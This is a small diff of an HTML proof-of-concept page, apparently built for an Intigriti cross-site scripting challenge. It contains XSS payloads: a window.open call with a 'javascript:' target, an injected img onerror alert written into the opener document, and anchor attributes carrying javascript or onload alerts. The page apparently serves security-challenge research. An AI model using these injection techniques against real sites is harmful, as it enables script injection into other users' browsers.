@@ -15,7 +15,7 @@
     var myWindow = window.open(this.contentWindow.name, 'javascript:alert(document.domain)');
     myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
   </script>
-  <a href="https://challenge.intigriti.io/" target="javascript:alert(1)">PoC</a>
+  <a href="https://challenge.intigriti.io/" target="_blank" onload="alert(111)">PoC</a>
 </body>
 
 </html>
